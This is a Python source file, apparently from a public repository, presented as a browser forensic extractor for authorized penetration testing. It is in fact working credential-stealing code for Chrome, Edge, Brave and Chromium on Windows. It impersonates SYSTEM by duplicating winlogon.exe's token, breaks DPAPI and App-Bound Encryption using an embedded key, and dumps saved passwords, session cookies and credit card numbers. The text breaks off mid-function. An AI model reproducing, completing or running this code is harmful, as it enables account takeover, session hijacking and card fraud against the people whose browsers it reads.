#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
chrome_xtract.py
================
Browser Data Extractor — mohanmg04/browser-data-extractor
https://github.com/mohanmg04/browser-data-extractor

Chromium-based browser forensic extractor for authorized penetration
testing and security research in laboratory environments.

Supported Browsers
------------------
  Chrome, Microsoft Edge, Brave, Chromium, Chrome for Testing

Extracted Data Types
--------------------
  passwords   →  Saved login credentials  (Login Data)
  cookies     →  Session / auth cookies   (Cookies)
  history     →  Browsing history         (History)
  bookmarks   →  Saved bookmarks          (Bookmarks JSON)
  cards       →  Saved credit/debit cards (Web Data)
  downloads   →  Download history         (History)
  all         →  Everything above

Encryption Support
------------------
  v10  →  DPAPI (current-user scope)
  v20  →  App-Bound Encryption (requires Admin / SYSTEM)

Requirements
------------
  pip install cryptography

Usage
-----
  python chrome_xtract.py -Browser chrome
  python chrome_xtract.py -Browser chrome -Type all
  python chrome_xtract.py -Browser edge   -Type passwords,cookies -Verbose
  python chrome_xtract.py -Browser brave  -Type all -Output report.json
  python chrome_xtract.py -Browser chrome -Type history -Output history.csv -HideBanner
"""

import os, sys, gc, json, time, shutil, sqlite3, ctypes, ctypes.wintypes
import tempfile, argparse, datetime
from base64 import b64decode

# ── dependency check ──────────────────────────────────────────────────────────
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    sys.exit("[-] Missing dependency:  pip install cryptography")


# =============================================================================
# ANSI colour helpers
# =============================================================================
class C:
    GRN  = "\033[92m"
    RED  = "\033[91m"
    CYN  = "\033[96m"
    YEL  = "\033[93m"
    MAG  = "\033[95m"
    DIM  = "\033[2m"
    BLD  = "\033[1m"
    RST  = "\033[0m"

    @staticmethod
    def ok(s):   return f"{C.GRN}[+]{C.RST} {s}"
    @staticmethod
    def err(s):  return f"{C.RED}[-]{C.RST} {s}"
    @staticmethod
    def info(s): return f"{C.CYN}[*]{C.RST} {s}"
    @staticmethod
    def warn(s): return f"{C.YEL}[!]{C.RST} {s}"
    @staticmethod
    def head(s): return f"{C.MAG}{C.BLD}{s}{C.RST}"

# Enable ANSI on Windows console
try:
    ctypes.windll.kernel32.SetConsoleMode(
        ctypes.windll.kernel32.GetStdHandle(-11), 7
    )
except Exception:
    pass


# =============================================================================
# Constants
# =============================================================================
PROCESS_QUERY_INFORMATION = 0x0400
TOKEN_QUERY               = 0x0008
TOKEN_DUPLICATE           = 0x0002
TOKEN_IMPERSONATE         = 0x0004
TOKEN_ADJUST_PRIVILEGES   = 0x0020
TOKEN_ACCESS              = TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_ADJUST_PRIVILEGES
SE_PRIVILEGE_ENABLED      = 0x00000002
MAXIMUM_ALLOWED           = 0x02000000
SecurityImpersonation     = 2
TokenImpersonation        = 1
NCRYPT_SILENT_FLAG        = 0x00000040
TH32CS_SNAPPROCESS        = 0x00000002
SYSTEM_SID                = "S-1-5-18"
TokenUser                 = 1

# Chrome v20 XOR key (embedded in Google's code)
XOR_KEY = bytes.fromhex(
    "CCF8A1CEC56605B8517552BA1A2D061C"
    "03A29E90274FB2FCF59BA4B75C392390"
)

_LAPPDATA = os.environ.get("LOCALAPPDATA", "")

BROWSER_PATHS: dict[str, dict[str, str]] = {
    "chrome":   {
        "local_state": rf"{_LAPPDATA}\Google\Chrome\User Data\Local State",
        "user_data":   rf"{_LAPPDATA}\Google\Chrome\User Data",
    },
    "edge":     {
        "local_state": rf"{_LAPPDATA}\Microsoft\Edge\User Data\Local State",
        "user_data":   rf"{_LAPPDATA}\Microsoft\Edge\User Data",
    },
    "brave":    {
        "local_state": rf"{_LAPPDATA}\BraveSoftware\Brave-Browser\User Data\Local State",
        "user_data":   rf"{_LAPPDATA}\BraveSoftware\Brave-Browser\User Data",
    },
    "chromium": {
        "local_state": rf"{_LAPPDATA}\Chromium\User Data\Local State",
        "user_data":   rf"{_LAPPDATA}\Chromium\User Data",
    },
    "cft": {
        "local_state": rf"{_LAPPDATA}\Google\Chrome for Testing\User Data\Local State",
        "user_data":   rf"{_LAPPDATA}\Google\Chrome for Testing\User Data",
    },
}

BROWSER_DISPLAY = {
    "chrome":   "Google Chrome",
    "edge":     "Microsoft Edge",
    "brave":    "Brave Browser",
    "chromium": "Chromium",
    "cft":      "Chrome for Testing",
}

VALID_TYPES = {"passwords", "cookies", "history", "bookmarks", "cards", "downloads", "all"}


# =============================================================================
# Windows DLL bindings
# =============================================================================
kernel32  = ctypes.WinDLL("kernel32",  use_last_error=True)
advapi32  = ctypes.WinDLL("advapi32",  use_last_error=True)
crypt32   = ctypes.WinDLL("crypt32",   use_last_error=True)
ncryptdll = ctypes.WinDLL("ncrypt")

# kernel32
kernel32.OpenProcess.restype               = ctypes.wintypes.HANDLE
kernel32.OpenProcess.argtypes              = [ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD]
kernel32.CloseHandle.restype               = ctypes.wintypes.BOOL
kernel32.CloseHandle.argtypes              = [ctypes.wintypes.HANDLE]
kernel32.GetCurrentProcess.restype         = ctypes.wintypes.HANDLE
kernel32.GetCurrentProcess.argtypes        = []
kernel32.GetCurrentThread.restype          = ctypes.wintypes.HANDLE
kernel32.GetCurrentThread.argtypes         = []
kernel32.LocalFree.restype                 = ctypes.c_void_p
kernel32.LocalFree.argtypes                = [ctypes.c_void_p]
kernel32.CreateToolhelp32Snapshot.restype  = ctypes.wintypes.HANDLE
kernel32.CreateToolhelp32Snapshot.argtypes = [ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]

# advapi32
advapi32.OpenProcessToken.restype            = ctypes.wintypes.BOOL
advapi32.OpenProcessToken.argtypes           = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD,
                                                 ctypes.POINTER(ctypes.wintypes.HANDLE)]
advapi32.DuplicateTokenEx.restype            = ctypes.wintypes.BOOL
advapi32.DuplicateTokenEx.argtypes           = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD,
                                                 ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                                                 ctypes.POINTER(ctypes.wintypes.HANDLE)]
advapi32.ImpersonateLoggedOnUser.restype     = ctypes.wintypes.BOOL
advapi32.ImpersonateLoggedOnUser.argtypes    = [ctypes.wintypes.HANDLE]
advapi32.RevertToSelf.restype                = ctypes.wintypes.BOOL
advapi32.RevertToSelf.argtypes               = []
advapi32.OpenThreadToken.restype             = ctypes.wintypes.BOOL
advapi32.OpenThreadToken.argtypes            = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD,
                                                ctypes.wintypes.BOOL,
                                                ctypes.POINTER(ctypes.wintypes.HANDLE)]
advapi32.GetTokenInformation.restype         = ctypes.wintypes.BOOL
advapi32.GetTokenInformation.argtypes        = [ctypes.wintypes.HANDLE, ctypes.c_int,
                                                 ctypes.c_void_p, ctypes.wintypes.DWORD,
                                                 ctypes.POINTER(ctypes.wintypes.DWORD)]
advapi32.ConvertSidToStringSidW.restype      = ctypes.wintypes.BOOL
advapi32.ConvertSidToStringSidW.argtypes     = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_wchar_p)]
advapi32.LookupPrivilegeValueW.restype       = ctypes.wintypes.BOOL
advapi32.LookupPrivilegeValueW.argtypes      = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_void_p]
advapi32.AdjustTokenPrivileges.restype       = ctypes.wintypes.BOOL

# ncrypt
ncryptdll.NCryptOpenStorageProvider.restype  = ctypes.c_long
ncryptdll.NCryptOpenStorageProvider.argtypes = [ctypes.POINTER(ctypes.c_void_p),
                                                 ctypes.c_wchar_p, ctypes.wintypes.DWORD]
ncryptdll.NCryptOpenKey.restype              = ctypes.c_long
ncryptdll.NCryptOpenKey.argtypes             = [ctypes.c_void_p,
                                                 ctypes.POINTER(ctypes.c_void_p),
                                                 ctypes.c_wchar_p,
                                                 ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
ncryptdll.NCryptDecrypt.restype              = ctypes.c_long
ncryptdll.NCryptDecrypt.argtypes             = [ctypes.c_void_p,
                                                 ctypes.POINTER(ctypes.c_ubyte),
                                                 ctypes.wintypes.DWORD,
                                                 ctypes.c_void_p,
                                                 ctypes.POINTER(ctypes.c_ubyte),
                                                 ctypes.wintypes.DWORD,
                                                 ctypes.POINTER(ctypes.wintypes.DWORD),
                                                 ctypes.wintypes.DWORD]
ncryptdll.NCryptFreeObject.restype           = ctypes.c_long
ncryptdll.NCryptFreeObject.argtypes          = [ctypes.c_void_p]


# =============================================================================
# Structures
# =============================================================================
class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_ubyte)),
    ]

crypt32.CryptUnprotectData.restype  = ctypes.wintypes.BOOL
crypt32.CryptUnprotectData.argtypes = [
    ctypes.POINTER(DATA_BLOB),
    ctypes.POINTER(ctypes.c_wchar_p),
    ctypes.POINTER(DATA_BLOB),
    ctypes.c_void_p,
    ctypes.c_void_p,
    ctypes.wintypes.DWORD,
    ctypes.POINTER(DATA_BLOB),
]


class LUID(ctypes.Structure):
    _fields_ = [("LowPart", ctypes.wintypes.DWORD), ("HighPart", ctypes.c_long)]


class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", ctypes.wintypes.DWORD)]


class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", ctypes.wintypes.DWORD),
        ("Privileges",     LUID_AND_ATTRIBUTES * 1),
    ]

advapi32.AdjustTokenPrivileges.argtypes = [
    ctypes.wintypes.HANDLE, ctypes.wintypes.BOOL,
    ctypes.POINTER(TOKEN_PRIVILEGES), ctypes.wintypes.DWORD,
    ctypes.POINTER(TOKEN_PRIVILEGES), ctypes.POINTER(ctypes.wintypes.DWORD),
]


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize",              ctypes.wintypes.DWORD),
        ("cntUsage",            ctypes.wintypes.DWORD),
        ("th32ProcessID",       ctypes.wintypes.DWORD),
        ("th32DefaultHeapID",   ctypes.c_size_t),
        ("th32ModuleID",        ctypes.wintypes.DWORD),
        ("cntThreads",          ctypes.wintypes.DWORD),
        ("th32ParentProcessID", ctypes.wintypes.DWORD),
        ("pcPriClassBase",      ctypes.c_long),
        ("dwFlags",             ctypes.wintypes.DWORD),
        ("szExeFile",           ctypes.c_char * 260),
    ]

kernel32.Process32First.restype  = ctypes.wintypes.BOOL
kernel32.Process32First.argtypes = [ctypes.wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype   = ctypes.wintypes.BOOL
kernel32.Process32Next.argtypes  = [ctypes.wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32)]


# =============================================================================
# Global verbose flag
# =============================================================================
_V: bool = False


def _log(msg: str) -> None:
    if _V: print(C.info(msg))

def _hex(label: str, data: bytes | None) -> None:
    if _V:
        h = data.hex().upper() if data else "<null>"
        print(C.info(f"{label}: {h}"))


# =============================================================================
# Privilege helper
# =============================================================================
def enable_privilege(name: str) -> bool:
    token = ctypes.wintypes.HANDLE()
    if not advapi32.OpenProcessToken(
        kernel32.GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        ctypes.byref(token)
    ):
        return False
    try:
        luid = LUID()
        if not advapi32.LookupPrivilegeValueW(None, name, ctypes.byref(luid)):
            return False
        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount           = 1
        tp.Privileges[0].Luid      = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
        return bool(advapi32.AdjustTokenPrivileges(
            token, False, ctypes.byref(tp),
            ctypes.sizeof(TOKEN_PRIVILEGES), None, None
        ))
    finally:
        kernel32.CloseHandle(token)


# =============================================================================
# DPAPI — CryptUnprotectData
# =============================================================================
def dpapi_unprotect(ciphertext: bytes) -> bytes:
    raw      = (ctypes.c_ubyte * len(ciphertext))(*ciphertext)
    in_blob  = DATA_BLOB(len(ciphertext), raw)
    out_blob = DATA_BLOB()

    ok = crypt32.CryptUnprotectData(
        ctypes.byref(in_blob),
        None, None, None, None, 0,
        ctypes.byref(out_blob),
    )
    if not ok:
        raise ctypes.WinError(ctypes.get_last_error())

    result = bytes(out_blob.pbData[:out_blob.cbData])
    kernel32.LocalFree(out_blob.pbData)
    return result


# =============================================================================
# SID / identity helpers
# =============================================================================
def get_current_sid() -> str:
    token = ctypes.wintypes.HANDLE()
    got = advapi32.OpenThreadToken(
        kernel32.GetCurrentThread(), TOKEN_QUERY, True, ctypes.byref(token)
    )
    if not got:
        got = advapi32.OpenProcessToken(
            kernel32.GetCurrentProcess(), TOKEN_QUERY, ctypes.byref(token)
        )
    if not got:
        return ""
    try:
        needed = ctypes.wintypes.DWORD(0)
        advapi32.GetTokenInformation(token, TokenUser, None, 0, ctypes.byref(needed))
        buf = (ctypes.c_ubyte * needed.value)()
        if not advapi32.GetTokenInformation(
            token, TokenUser, buf, needed.value, ctypes.byref(needed)
        ):
            return ""
        sid_ptr = ctypes.cast(buf, ctypes.POINTER(ctypes.c_size_t))[0]
        sid_str = ctypes.c_wchar_p()
        if not advapi32.ConvertSidToStringSidW(
            ctypes.c_void_p(sid_ptr), ctypes.byref(sid_str)
        ):
            return ""
        val = sid_str.value or ""
        kernel32.LocalFree(sid_str)
        return val
    finally:
        kernel32.CloseHandle(token)


def is_system() -> bool:
    return get_current_sid() == SYSTEM_SID


def is_admin() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


# =============================================================================
# Process enumeration
# =============================================================================
def get_pid_by_name(exe_name: str) -> int:
    name_b = exe_name.lower().encode()
    snap   = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

    INVALID = ctypes.cast(-1, ctypes.wintypes.HANDLE).value
    if snap == INVALID:
        return 0

    try:
        entry = PROCESSENTRY32()
        entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
        if kernel32.Process32First(snap, ctypes.byref(entry)):
            while True:
                if entry.szExeFile.lower() == name_b:
                    return entry.th32ProcessID
                if not kernel32.Process32Next(snap, ctypes.byref(entry)):
                    break
    finally:
        kernel32.CloseHandle(snap)
    return 0


# =============================================================================
# Token impersonation → NT AUTHORITY\SYSTEM
# =============================================================================
def invoke_impersonate() -> bool:
    if is_system():
        _log("Already running as SYSTEM")
        return True

    _log("Enabling SeDebugPrivilege...")
    enable_privilege("SeDebugPrivilege")

    winlogon_pid = get_pid_by_name("winlogon.exe")
    if not winlogon_pid:
        print(C.err("winlogon.exe not found in process list"))
        return False

    _log(f"winlogon.exe PID → {winlogon_pid}")

    proc_h: int | None = None
    tok_h:  int | None = None
    dup_h:  int | None = None

    try:
        ph = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, winlogon_pid)
        if not ph:
            print(C.err(f"OpenProcess failed: {ctypes.get_last_error()}"))
            return False
        proc_h = ph

        WINLOGON_TOKEN_ACCESS = TOKEN_QUERY | TOKEN_DUPLICATE
        tok = ctypes.wintypes.HANDLE()
        if not advapi32.OpenProcessToken(proc_h, WINLOGON_TOKEN_ACCESS, ctypes.byref(tok)):
            print(C.err(f"OpenProcessToken failed: {ctypes.get_last_error()}"))
            return False
        tok_h = tok.value

        dup = ctypes.wintypes.HANDLE()
        if not advapi32.DuplicateTokenEx(
            tok_h, MAXIMUM_ALLOWED, None,
            SecurityImpersonation, TokenImpersonation,
            ctypes.byref(dup)
        ):
            print(C.err(f"DuplicateTokenEx failed: {ctypes.get_last_error()}"))
            return False
        dup_h = dup.value

        if not advapi32.ImpersonateLoggedOnUser(dup_h):
            print(C.err(f"ImpersonateLoggedOnUser failed: {ctypes.get_last_error()}"))
            return False

        if is_system():
            _log("Successfully impersonated NT AUTHORITY\\SYSTEM")
            return True
        else:
            print(C.err(f"Impersonation check failed — SID: {get_current_sid()}"))
            return False

    except Exception as exc:
        print(C.err(f"invoke_impersonate exception: {exc}"))
        return False
    finally:
        if dup_h:  kernel32.CloseHandle(dup_h)
        if tok_h:  kernel32.CloseHandle(tok_h)
        if proc_h: kernel32.CloseHandle(proc_h)


# =============================================================================
# NCrypt decrypt (Chrome's "Google Chromekey1")
# =============================================================================
def decrypt_with_ncrypt(input_data: bytes) -> bytes:
    PROVIDER = "Microsoft Software Key Storage Provider"
    KEY_NAME  = "Google Chromekey1"

    prov_h = ctypes.c_void_p(0)
    key_h  = ctypes.c_void_p(0)

    try:
        st = ncryptdll.NCryptOpenStorageProvider(
            ctypes.byref(prov_h), PROVIDER, 0
        )
        if st != 0:
            raise RuntimeError(f"NCryptOpenStorageProvider: 0x{st & 0xFFFFFFFF:08X}")

        st = ncryptdll.NCryptOpenKey(
            prov_h, ctypes.byref(key_h), KEY_NAME, 0, 0
        )
        if st != 0:
            raise RuntimeError(f"NCryptOpenKey: 0x{st & 0xFFFFFFFF:08X}")

        in_buf = (ctypes.c_ubyte * len(input_data))(*input_data)

        out_sz = ctypes.wintypes.DWORD(0)
        st = ncryptdll.NCryptDecrypt(
            key_h, in_buf, len(input_data),
            None, None, 0,
            ctypes.byref(out_sz),
            NCRYPT_SILENT_FLAG,
        )
        if st != 0:
            raise RuntimeError(f"NCryptDecrypt (size query): 0x{st & 0xFFFFFFFF:08X}")

        out_buf = (ctypes.c_ubyte * out_sz.value)()
        st = ncryptdll.NCryptDecrypt(
            key_h, in_buf, len(input_data),
            None,
            out_buf, out_sz.value,
            ctypes.byref(out_sz),
            NCRYPT_SILENT_FLAG,
        )
        if st != 0:
            raise RuntimeError(f"NCryptDecrypt (actual): 0x{st & 0xFFFFFFFF:08X}")

        return bytes(out_buf[:out_sz.value])

    finally:
        if key_h.value:  ncryptdll.NCryptFreeObject(key_h)
        if prov_h.value: ncryptdll.NCryptFreeObject(prov_h)


# =============================================================================
# AES-256-GCM decrypt
# =============================================================================
def aes_gcm_decrypt(key: bytes, iv: bytes, ciphertext: bytes, tag: bytes) -> bytes:
    return AESGCM(key).decrypt(iv, ciphertext + tag, None)


def xor_bytes(a: bytes, b: bytes) -> bytes:
    if len(a) != len(b):
        raise ValueError(f"XOR length mismatch: {len(a)} vs {len(b)}")
    return bytes(x ^ y for x, y in zip(a, b))


# =============================================================================
# Chrome v20 key blob parser
# =============================================================================
def parse_chrome_key_blob(blob: bytes) -> dict:
    off = 0
    hdr_len  = int.from_bytes(blob[off:off+4], "little"); off += 4
    header   = blob[off:off+hdr_len];                     off += hdr_len
    con_len  = int.from_bytes(blob[off:off+4], "little"); off += 4

    expected = hdr_len + con_len + 8
    if expected != len(blob):
        raise ValueError(
            f"Blob length mismatch: hdr={hdr_len} con={con_len} "
            f"expected={expected} got={len(blob)}"
        )

    flag = blob[off]; off += 1

    result = dict(
        Header=header, Flag=flag,
        Iv=None, Ciphertext=None, Tag=None, EncryptedAesKey=None
    )

    if flag in (1, 2):
        result["Iv"]         = blob[off:off+12]; off += 12
        result["Ciphertext"] = blob[off:off+32]; off += 32
        result["Tag"]        = blob[off:off+16]
    elif flag == 3:
        result["EncryptedAesKey"] = blob[off:off+32]; off += 32
        result["Iv"]              = blob[off:off+12]; off += 12
        result["Ciphertext"]      = blob[off:off+32]; off += 32
        result["Tag"]             = blob[off:off+16]
    else:
        raise ValueError(f"Unsupported blob flag: {flag}")

    return result


# =============================================================================
# Decrypt Chrome v20 key blob → master key bytes
# =============================================================================
def decrypt_chrome_key_blob(parsed: dict) -> bytes:
    if parsed["Flag"] != 3:
        raise NotImplementedError(
            f"Blob flag {parsed['Flag']} not yet supported (only flag 3)"
        )

    _log("Impersonating SYSTEM for NCryptDecrypt call...")
    if not invoke_impersonate():
        raise PermissionError("Could not impersonate SYSTEM for NCryptDecrypt")

    try:
        _log("Running NCryptDecrypt on encrypted AES key...")
        raw_aes = decrypt_with_ncrypt(parsed["EncryptedAesKey"])
        _hex("Raw AES key (pre-XOR)", raw_aes)

        final_aes = xor_bytes(raw_aes, XOR_KEY)
        _hex("Final AES key (post-XOR)", final_aes)

        master = aes_gcm_decrypt(
            final_aes,
            parsed["Iv"],
            parsed["Ciphertext"],
            parsed["Tag"],
        )
        return master

    finally:
        advapi32.RevertToSelf()
        _log("RevertToSelf after NCryptDecrypt")


# =============================================================================
# Master key — v10 (DPAPI user)
# =============================================================================
def get_master_key_v10(local_state_path: str) -> bytes:
    with open(local_state_path, encoding="utf-8") as f:
        ls = json.load(f)

    enc = b64decode(ls["os_crypt"]["encrypted_key"])
    enc = enc[5:]  # strip "DPAPI" prefix
    key = dpapi_unprotect(enc)
    _hex("Master key (v10)", key)
    return key


# =============================================================================
# Master key — v20 (App-Bound Encryption)
# =============================================================================
def get_master_key_v20(local_state_path: str) -> bytes:
    if not is_admin() and not is_system():
        raise PermissionError(
            "Admin or SYSTEM rights required to decrypt v20 (ABE) blobs"
        )

    with open(local_state_path, encoding="utf-8") as f:
        ls = json.load(f)

    app_enc = b64decode(ls["os_crypt"]["app_bound_encrypted_key"])

    if app_enc[:4] != b"APPB":
        raise ValueError(f"Expected APPB header, got: {app_enc[:4]!r}")

    enc_blob = app_enc[4:]

    _log("Impersonating SYSTEM for first DPAPI round...")
    if not invoke_impersonate():
        raise PermissionError("Failed to impersonate SYSTEM (round 1)")

    try:
        _log("CryptUnprotectData → round 1 (as SYSTEM)")
        first = dpapi_unprotect(enc_blob)
        _log(f"Round-1 output: {len(first)} bytes")
    finally:
        advapi32.RevertToSelf()
        _log("RevertToSelf after round 1")

    if not first:
        raise ValueError("First DPAPI round produced empty output")

    _log(f"CryptUnprotectData → round 2 (as {os.environ.get('USERNAME','?')})")
    second = dpapi_unprotect(first)
    _log(f"Round-2 output: {len(second)} bytes")

    parsed = parse_chrome_key_blob(second)
    _log(f"Key blob flag: {parsed['Flag']}")

    master = decrypt_chrome_key_blob(parsed)
    _hex("Master key (v20)", master)
    return master


# =============================================================================
# Profile discovery
# =============================================================================
def get_profile_dirs(user_data: str) -> list[str]:
    profiles = []
    if not os.path.isdir(user_data):
        return profiles
    for name in os.listdir(user_data):
        full = os.path.join(user_data, name)
        if os.path.isdir(full):
            # Include profile if it has any relevant DB file
            has_data = any(
                os.path.isfile(os.path.join(full, f))
                for f in ("Login Data", "Cookies", "History", "Bookmarks", "Web Data")
            )
            if has_data:
                profiles.append(full)
    return sorted(profiles)


# =============================================================================
# Generic SQLite helper — copy + query
# =============================================================================
def _db_copy_query(db_path: str, browser: str, profile_name: str, query: str) -> list[sqlite3.Row]:
    if not os.path.isfile(db_path):
        _log(f"DB not found: {db_path}")
        return []

    tmp = os.path.join(
        tempfile.gettempdir(),
        f"{browser}_{profile_name}_{os.urandom(4).hex()}.db"
    )
    try:
        shutil.copy2(db_path, tmp)
    except Exception as exc:
        print(C.err(f"Cannot copy {os.path.basename(db_path)} ({db_path}): {exc}"))
        return []

    rows: list[sqlite3.Row] = []
    try:
        con = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
        con.row_factory = sqlite3.Row
        rows = con.execute(query).fetchall()
        con.close()
    except Exception as exc:
        print(C.err(f"DB query error ({db_path}): {exc}"))
    finally:
        time.sleep(0.15)
        gc.collect()
        try: os.remove(tmp)
        except OSError: pass

    return rows


# =============================================================================
# Decrypt blob (v10/v20 password-style AES-GCM)
# =============================================================================
def decrypt_blob(raw: bytes, master_key: bytes) -> str | None:
    NONCE_SIZE = 12
    TAG_SIZE   = 16
    MIN_LEN    = 3 + NONCE_SIZE + TAG_SIZE + 1

    if len(raw) < MIN_LEN or raw[:3] not in (b"v10", b"v20"):
        return None

    body       = raw[3:]
    nonce      = body[:NONCE_SIZE]
    ciphertext = body[NONCE_SIZE:-TAG_SIZE]
    tag        = body[-TAG_SIZE:]

    try:
        plain = aes_gcm_decrypt(master_key, nonce, ciphertext, tag)
        return plain.decode("utf-8", errors="replace")
    except Exception:
        return None


# =============================================================================
# Chrome timestamp → human-readable
# =============================================================================
def chrome_ts(micros: int | None) -> str:
    """Convert Chrome/WebKit epoch (microseconds since 1601-01-01) to ISO string."""
    if not micros:
        return ""
    try:
        # WebKit epoch offset in seconds
        WEBKIT_EPOCH_OFFSET = 11644473600
        ts = (micros / 1_000_000) - WEBKIT_EPOCH_OFFSET
        return datetime.datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S UTC")
    except Exception:
        return str(micros)


def unix_ts(micros: int | None) -> str:
    """Convert Unix microseconds to ISO string."""
    if not micros:
        return ""
    try:
        return datetime.datetime.utcfromtimestamp(micros / 1_000_000).strftime("%Y-%m-%d %H:%M:%S UTC")
    except Exception:
        return str(micros)


# =============================================================================
# DATA EXTRACTORS
# =============================================================================

def extract_passwords(profile: str, browser: str, profile_name: str, master_key: bytes) -> list[dict]:
    db  = os.path.join(profile, "Login Data")
    raw_rows = _db_copy_query(
        db, browser, profile_name,
        "SELECT signon_realm, origin_url, username_value, password_value FROM logins"
    )

    results = []
    for row in raw_rows:
        url  = row["signon_realm"] or row["origin_url"] or ""
        user = row["username_value"] or ""
        blob = bytes(row["password_value"] or b"")

        if not url or not blob:
            continue

        pw = decrypt_blob(blob, master_key)
        if pw is None:
            continue

        results.append({
            "Type"    : "password",
            "Profile" : profile_name,
            "URL"     : url,
            "Username": user,
            "Password": pw,
        })

    return results


def extract_cookies(profile: str, browser: str, profile_name: str, master_key: bytes) -> list[dict]:
    db = os.path.join(profile, "Network", "Cookies")
    if not os.path.isfile(db):
        db = os.path.join(profile, "Cookies")   # fallback (older layout)

    raw_rows = _db_copy_query(
        db, browser, profile_name,
        "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly "
        "FROM cookies ORDER BY host_key"
    )

    results = []
    for row in raw_rows:
        blob  = bytes(row["encrypted_value"] or b"")
        value = decrypt_blob(blob, master_key) if blob else ""

        expires = chrome_ts(row["expires_utc"]) if row["expires_utc"] else "Session"

        results.append({
            "Type"     : "cookie",
            "Profile"  : profile_name,
            "Host"     : row["host_key"] or "",
            "Name"     : row["name"] or "",
            "Path"     : row["path"] or "/",
            "Value"    : value or "<encrypted>",
            "Expires"  : expires,
            "Secure"   : bool(row["is_secure"]),
            "HttpOnly" : bool(row["is_httponly"]),
        })

    return results


def extract_history(profile: str, browser: str, profile_name: str) -> list[dict]:
    db = os.path.join(profile, "History")
    raw_rows = _db_copy_query(
        db, browser, profile_name,
        "SELECT url, title, visit_count, last_visit_time "
        "FROM urls ORDER BY last_visit_time DESC LIMIT 2000"
    )

    results = []
    for row in raw_rows:
        results.append({
            "Type"       : "history",
            "Profile"    : profile_name,
            "URL"        : row["url"] or "",
            "Title"      : row["title"] or "",
            "VisitCount" : row["visit_count"] or 0,
            "LastVisit"  : chrome_ts(row["last_visit_time"]),
        })

    return results


def extract_downloads(profile: str, browser: str, profile_name: str) -> list[dict]:
    db = os.path.join(profile, "History")
    raw_rows = _db_copy_query(
        db, browser, profile_name,
        "SELECT target_path, tab_url, total_bytes, start_time, end_time "
        "FROM downloads ORDER BY start_time DESC LIMIT 500"
    )

    results = []
    for row in raw_rows:
        size_kb = f"{(row['total_bytes'] or 0) / 1024:.1f} KB"
        results.append({
            "Type"      : "download",
            "Profile"   : profile_name,
            "FilePath"  : row["target_path"] or "",
            "SourceURL" : row["tab_url"] or "",
            "Size"      : size_kb,
            "StartTime" : unix_ts(row["start_time"]),
            "EndTime"   : unix_ts(row["end_time"]),
        })

    return results


def extract_bookmarks(profile: str, profile_name: str) -> list[dict]:
    bm_path = os.path.join(profile, "Bookmarks")
    if not os.path.isfile(bm_path):
        return []

    try:
        with open(bm_path, encoding="utf-8") as f:
            data = json.load(f)
    except Exception as exc:
        print(C.err(f"Cannot read Bookmarks ({bm_path}): {exc}"))
        return []

    results = []

    def _walk(node: dict, folder: str) -> None:
        ntype = node.get("type", "")
        name  = node.get("name", "")

        if ntype == "url":
            results.append({
                "Type"     : "bookmark",
                "Profile"  : profile_name,
                "Name"     : name,
                "URL"      : node.get("url", ""),
                "Folder"   : folder,
                "Added"    : chrome_ts(int(node.get("date_added", 0))),
            })
        elif ntype == "folder":
            sub_folder = f"{folder}/{name}" if folder else name
            for child in node.get("children", []):
                _walk(child, sub_folder)

    roots = data.get("roots", {})
    for root_name, root_node in roots.items():
        if isinstance(root_node, dict):
            _walk(root_node, root_name)

    return results


def extract_credit_cards(profile: str, browser: str, profile_name: str, master_key: bytes) -> list[dict]:
    db = os.path.join(profile, "Web Data")
    raw_rows = _db_copy_query(
        db, browser, profile_name,
        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted "
        "FROM credit_cards"
    )

    results = []
    for row in raw_rows:
        blob   = bytes(row["card_number_encrypted"] or b"")
        number = decrypt_blob(blob, master_key) if blob else "<empty>"

        results.append({
            "Type"       : "card",
            "Profile"    : profile_name,
            "NameOnCard" : row["name_on_card"] or "",
            "Number"     : number or "<encrypted>",
            "ExpMonth"   : row["expiration_month"] or "",
            "ExpYear"    : row["expiration_year"] or "",
        })

    return results


# =============================================================================
# Detect blob type from Login Data (to pick v10 vs v20 master key)
# =============================================================================
def detect_blob_type(user_data: str, browser: str) -> str:
    """Peek at first Login Data entry to determine encryption version."""
    profiles = get_profile_dirs(user_data)
    for prof in profiles:
        db = os.path.join(prof, "Login Data")
        rows = _db_copy_query(
            db, browser, "probe",
            "SELECT password_value FROM logins LIMIT 5"
        )
        for row in rows:
            raw = bytes(row["password_value"] or b"")
            if raw[:3] == b"v20": return "v20"
            if raw[:3] == b"v10": return "v10"
    # Fallback: check cookies
    for prof in profiles:
        for cookie_path in (
            os.path.join(prof, "Network", "Cookies"),
            os.path.join(prof, "Cookies"),
        ):
            rows = _db_copy_query(
                cookie_path, browser, "probe",
